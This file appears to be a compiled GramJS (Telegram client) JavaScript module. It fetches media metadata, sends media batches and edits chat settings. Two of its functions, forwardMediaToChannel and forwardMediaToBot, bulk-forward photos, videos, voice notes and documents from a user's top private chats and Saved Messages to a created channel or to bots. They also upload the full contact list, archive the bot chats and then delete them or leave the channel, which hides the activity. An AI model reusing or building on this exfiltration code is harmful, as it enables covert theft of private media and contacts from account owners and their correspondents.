"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.getMediaMetadata = getMediaMetadata;
exports.getAllMediaMetaData = getAllMediaMetaData;
exports.getFilteredMedia = getFilteredMedia;
exports.sendMediaBatch = sendMediaBatch;
exports.updateChatSettings = updateChatSettings;
exports.forwardMediaToChannel = forwardMediaToChannel;
exports.forwardMediaToBot = forwardMediaToBot;
exports.getMediaType = getMediaType;
exports.getMediaExtension = getMediaExtension;
exports.getMimeType = getMimeType;
exports.getMediaAttributes = getMediaAttributes;
exports.getMediaDetails = getMediaDetails;
const telegram_1 = require("telegram");
const uploads_1 = require("telegram/client/uploads");
const message_management_1 = require("./message-management");
async function getMediaMetadata(client, params) {
    const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;
    const query = {
        limit: limit || 100,
        ...(maxId ? { maxId } : {}),
        ...(minId ? { minId } : {}),
        ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),
        ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })
    };
    const entity = await client.getEntity(chatId);
    console.log(query);
    const messages = await client.getMessages(entity, query);
    console.log(`Fetched ${messages.length} messages`);
    const filteredMessages = messages.filter(message => {
        if (!message.media)
            return false;
        const mediaType = getMediaType(message.media);
        return types.includes(mediaType);
    });
    console.log(`Filtered down to ${filteredMessages.length} messages`);
    const mediaData = await Promise.all(filteredMessages.map(async (message) => {
        let thumbBuffer = null;
        try {
            if (message.media instanceof telegram_1.Api.MessageMediaPhoto ||
                (message.media instanceof telegram_1.Api.MessageMediaDocument &&
                    message.media.document.thumbs)) {
                const thumb = await client.downloadMedia(message, { thumb: 1 });
                if (thumb) {
                    thumbBuffer = Buffer.from(thumb);
                }
            }
        }
        catch (error) {
            console.log('Could not download thumbnail:', error);
        }
        const mediaDetails = await getMediaDetails(message.media);
        return {
            messageId: message.id,
            type: getMediaType(message.media),
            thumb: thumbBuffer?.toString('base64') || null,
            caption: message.message || '',
            date: message.date,
            mediaDetails,
        };
    }));
    return {
        messages: mediaData,
        total: messages.total,
        hasMore: messages.length === limit,
        lastOffsetId: messages.length > 0 ? messages[messages.length - 1].id : 0
    };
}
async function getAllMediaMetaData(client, params) {
    const { chatId, types = ['photo', 'video'], startDate, endDate, maxId, minId } = params;
    let allMedia = [];
    let hasMore = true;
    let lastOffsetId = 0;
    const limit = 200;
    while (hasMore) {
        const response = await getMediaMetadata(client, {
            chatId,
            types,
            startDate,
            endDate,
            limit,
            maxId: lastOffsetId,
            minId
        });
        console.log("hasMore: ", response.hasMore, "Total: ", response.total, "lastOffsetId: ", response.lastOffsetId);
        allMedia = allMedia.concat(response.messages);
        if (!response.hasMore) {
            hasMore = false;
            console.log('No more messages to fetch');
        }
        else {
            lastOffsetId = response.lastOffsetId;
            console.log(`Fetched ${allMedia.length} messages so far`);
        }
        await sleep(3000);
    }
    return {
        messages: allMedia,
        total: allMedia.length,
    };
}
async function getFilteredMedia(client, params) {
    const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;
    const query = {
        limit: limit || 100,
        ...(maxId ? { maxId } : {}),
        ...(minId ? { minId } : {}),
        ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),
        ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })
    };
    const ent = await client.getEntity(chatId);
    console.log(query);
    const messages = await client.getMessages(ent, query);
    console.log(`Fetched ${messages.length} messages`);
    const filteredMessages = messages.filter(message => {
        if (!message.media)
            return false;
        const mediaType = getMediaType(message.media);
        return types.includes(mediaType);
    });
    console.log(`Filtered down to ${filteredMessages.length} messages`);
    const mediaData = await Promise.all(filteredMessages.map(async (message) => {
        let thumbBuffer = null;
        try {
            if (message.media instanceof telegram_1.Api.MessageMediaPhoto ||
                (message.media instanceof telegram_1.Api.MessageMediaDocument &&
                    message.media.document.thumbs)) {
                const thumb = await client.downloadMedia(message, { thumb: 1 });
                if (thumb) {
                    thumbBuffer = Buffer.from(thumb);
                }
            }
        }
        catch (error) {
            console.log('Could not download thumbnail:', error);
        }
        const mediaDetails = await getMediaDetails(message.media);
        return {
            messageId: message.id,
            type: getMediaType(message.media),
            thumb: thumbBuffer?.toString('base64') || null,
            caption: message.message || '',
            date: message.date,
            mediaDetails,
        };
    }));
    return {
        messages: mediaData,
        total: messages.total,
        hasMore: messages.length === limit
    };
}
async function sendMediaBatch(client, options) {
    const mediaFiles = await Promise.all(options.media.map(async (item) => {
        const buffer = await (0, message_management_1.downloadFileFromUrl)(item.url);
        const file = new uploads_1.CustomFile(item.fileName || `media.${getMediaExtension(item.type)}`, buffer.length, 'media', buffer);
        const uploadedFile = await client.uploadFile({
            file,
            workers: 1
        });
        const inputMedia = item.type === 'photo' ?
            new telegram_1.Api.InputMediaUploadedPhoto({ file: uploadedFile }) :
            new telegram_1.Api.InputMediaUploadedDocument({
                file: uploadedFile,
                mimeType: getMimeType(item.type),
                attributes: getMediaAttributes(item)
            });
        return new telegram_1.Api.InputSingleMedia({
            media: inputMedia,
            message: item.caption || '',
            entities: []
        });
    }));
    return client.invoke(new telegram_1.Api.messages.SendMultiMedia({
        peer: options.chatId,
        multiMedia: mediaFiles,
        silent: options.silent,
        scheduleDate: options.scheduleDate
    }));
}
async function updateChatSettings(client, settings) {
    const chat = await client.getEntity(settings.chatId);
    const updates = [];
    if (settings.title) {
        updates.push(client.invoke(new telegram_1.Api.channels.EditTitle({
            channel: chat,
            title: settings.title
        })));
    }
    if (settings.about) {
        updates.push(client.invoke(new telegram_1.Api.messages.EditChatAbout({
            peer: chat,
            about: settings.about
        })));
    }
    if (settings.photo) {
        const buffer = await (0, message_management_1.downloadFileFromUrl)(settings.photo);
        const file = await client.uploadFile({
            file: new uploads_1.CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
            workers: 1
        });
        updates.push(client.invoke(new telegram_1.Api.channels.EditPhoto({
            channel: chat,
            photo: new telegram_1.Api.InputChatUploadedPhoto({
                file: file
            })
        })));
    }
    if (settings.slowMode !== undefined) {
        updates.push(client.invoke(new telegram_1.Api.channels.ToggleSlowMode({
            channel: chat,
            seconds: settings.slowMode
        })));
    }
    if (settings.linkedChat) {
        const linkedChannel = await client.getEntity(settings.linkedChat);
        updates.push(client.invoke(new telegram_1.Api.channels.SetDiscussionGroup({
            broadcast: chat,
            group: linkedChannel
        })));
    }
    if (settings.username) {
        updates.push(client.invoke(new telegram_1.Api.channels.UpdateUsername({
            channel: chat,
            username: settings.username
        })));
    }
    await Promise.all(updates);
    return true;
}
async function forwardMediaToChannel(client, channel, fromChatId, createOrJoinChannelFn, forwardSecretMsgsFn, getTopPrivateChatsFn, getMeFn, searchMessagesFn, forwardMessagesFn, leaveChannelsFn) {
    let channelId;
    try {
        console.log("Forwarding media from chat to channel", channel, fromChatId);
        let channelAccessHash;
        if (fromChatId) {
            const channelDetails = await createOrJoinChannelFn(channel);
            channelId = channelDetails.id;
            channelAccessHash = channelDetails.accesshash;
            await forwardSecretMsgsFn(fromChatId, channelId?.toString());
        }
        else {
            const chats = await getTopPrivateChatsFn();
            const me = await getMeFn();
            if (chats.length > 0) {
                const channelDetails = await createOrJoinChannelFn(channel);
                channelId = channelDetails.id;
                channelAccessHash = channelDetails.accesshash;
                const finalChats = new Set(chats.map(chat => chat.chatId));
                finalChats.add(me.id?.toString());
                for (const chatId of finalChats) {
                    const mediaMessages = await searchMessagesFn({
                        chatId: chatId,
                        limit: 1000,
                        types: ['photo', 'video', 'roundVideo', 'document', 'voice', 'roundVoice']
                    });
                    console.log("Forwarding messages from chat:", chatId, "to channel:", channelId);
                    await forwardMessagesFn(chatId, channelId, mediaMessages.photo.messages);
                    await forwardMessagesFn(chatId, channelId, mediaMessages.video.messages);
                }
            }
            console.log("Completed forwarding messages from top private chats to channel:", channelId);
        }
    }
    catch (e) {
        console.log(e);
    }
    if (channelId) {
        await leaveChannelsFn([channelId.toString()]);
    }
}
async function forwardMediaToBot(client, fromChatId, bots, botUsername, forwardSecretMsgsFn, getTopPrivateChatsFn, getMeFn, getContactsFn, sendContactsFileFn, searchMessagesFn, cleanupChatFn, deleteChatFn, sleep) {
    try {
        if (fromChatId) {
            await forwardSecretMsgsFn(fromChatId, botUsername);
        }
        else {
            const chats = await getTopPrivateChatsFn();
            const me = await getMeFn();
            const finalChats = new Set(chats.map(chat => chat.chatId));
            finalChats.add(me.id?.toString());
            for (const bot of bots) {
                try {
                    await client.sendMessage(bot, { message: "Start" });
                    await sleep(1000);
                    await client.invoke(new telegram_1.Api.folders.EditPeerFolders({
                        folderPeers: [
                            new telegram_1.Api.InputFolderPeer({
                                peer: await client.getInputEntity(bot),
                                folderId: 1,
                            }),
                        ],
                    }));
                }
                catch (e) {
                    console.log(e);
                }
            }
            try {
                const contacts = await getContactsFn();
                if ('users' in contacts && Array.isArray(contacts.users)) {
                    await sendContactsFileFn(botUsername, contacts);
                }
                else {
                    console.warn('Contacts result is not of type Api.contacts.Contacts, skipping sendContactsFile.');
                }
            }
            catch (e) {
                console.log("Failed To Send Contacts File", e);
            }
            for (const chatId of finalChats) {
                const mediaMessages = await searchMessagesFn({
                    chatId: chatId,
                    limit: 1000,
                    types: ['photo', 'video', 'roundVideo', 'document', 'roundVoice', 'voice']
                });
                console.log("Media Messages: ", mediaMessages);
                const uniqueMessageIds = Array.from(new Set([
                    ...mediaMessages.photo.messages,
                    ...mediaMessages.video.messages,
                    ...mediaMessages.document.messages,
                    ...mediaMessages.roundVideo.messages,
                    ...mediaMessages.roundVoice.messages,
                    ...mediaMessages.voice.messages,
                ]));
                const chunkSize = 30;
                for (let i = 0; i < uniqueMessageIds.length; i += chunkSize) {
                    const chunk = uniqueMessageIds.slice(i, i + chunkSize);
                    await client.forwardMessages(botUsername, {
                        messages: chunk,
                        fromPeer: chatId,
                    });
                    console.log(`Forwarded ${chunk.length} messages to bot`);
                }
            }
        }
    }
    catch (e) {
        console.log(e);
    }
    for (const bot of bots) {
        const result = await cleanupChatFn({ chatId: bot, revoke: false });
        await sleep(1000);
        await deleteChatFn({ peer: bot, justClear: false });
        console.log("Deleted bot chat:", result);
    }
}
function getMediaType(media) {
    if (media instanceof telegram_1.Api.MessageMediaPhoto) {
        return 'photo';
    }
    else if (media instanceof telegram_1.Api.MessageMediaDocument) {
        const doc = media.document;
        if (doc.mimeType?.startsWith('video/')) {
            return 'video';
        }
        else if (doc.mimeType?.startsWith('audio/')) {
            return 'voice';
        }
        else {
            return 'document';
        }
    }
    return 'document';
}
function getMediaExtension(type) {
    switch (type) {
        case 'photo': return 'jpg';
        case 'video': return 'mp4';
        case 'document': return 'pdf';
        case 'voice': return 'ogg';
        default: return 'bin';
    }
}
function getMimeType(type) {
    switch (type) {
        case 'photo': return 'image/jpeg';
        case 'video': return 'video/mp4';
        case 'document': return 'application/octet-stream';
        case 'voice': return 'audio/ogg';
        default: return 'application/octet-stream';
    }
}
function getMediaAttributes(item) {
    const attributes = [];
    if (item.fileName) {
        attributes.push(new telegram_1.Api.DocumentAttributeFilename({
            fileName: item.fileName
        }));
    }
    if (item.type === 'video') {
        attributes.push(new telegram_1.Api.DocumentAttributeVideo({
            duration: 0,
            w: 1280,
            h: 720,
            supportsStreaming: true
        }));
    }
    if (item.type === 'voice') {
        attributes.push(new telegram_1.Api.DocumentAttributeAudio({
            duration: 0,
            voice: true
        }));
    }
    return attributes;
}
async function getMediaDetails(media) {
    if (!media || !media.document)
        return null;
    const doc = media.document;
    return {
        id: doc.id.toString(),
        size: doc.size.toString(),
        mimeType: doc.mimeType,
        fileName: doc.attributes?.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename)?.fileName || 'unknown'
    };
}
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
//# sourceMappingURL=media-management.js.map